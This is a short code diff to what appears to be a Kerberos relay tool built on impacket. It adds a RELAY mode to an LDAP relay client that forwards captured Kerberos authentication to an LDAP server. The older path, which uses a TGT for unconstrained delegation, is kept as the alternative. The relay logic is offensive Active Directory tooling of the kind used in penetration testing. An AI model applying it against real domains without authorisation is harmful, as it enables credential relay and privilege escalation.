@@ -10,7 +10,7 @@ except ImportError:
     sys.exit(1)
 
 from lib.clients import ProtocolClient
-from lib.utils.kerberos import ldap_kerberos
+from lib.utils.kerberos import ldap_kerberos, ldap_kerberos_auth
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
 from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN
 from impacket.spnego import SPNEGO_NegTokenResp
@@ -39,7 +39,12 @@ class LDAPRelayClient(ProtocolClient):
             kdc = authdata['domain']
         self.server = Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
         self.session = Connection(self.server, user="a", password="b", authentication=SASL, sasl_mechanism=KERBEROS)
-        ldap_kerberos(authdata['domain'], kdc, authdata['tgt'], authdata['username'], self.session, self.targetHost)
+        if self.serverConfig.mode == 'RELAY':
+            # Pass-thought auth
+            ldap_kerberos_auth(self.session, authdata['krbauth'])
+        else:
+            # Unconstrained delegation mode
+            ldap_kerberos(authdata['domain'], kdc, authdata['tgt'], authdata['username'], self.session, self.targetHost)
 
 class LDAPSRelayClient(LDAPRelayClient):
     PLUGIN_NAME = "LDAPS"
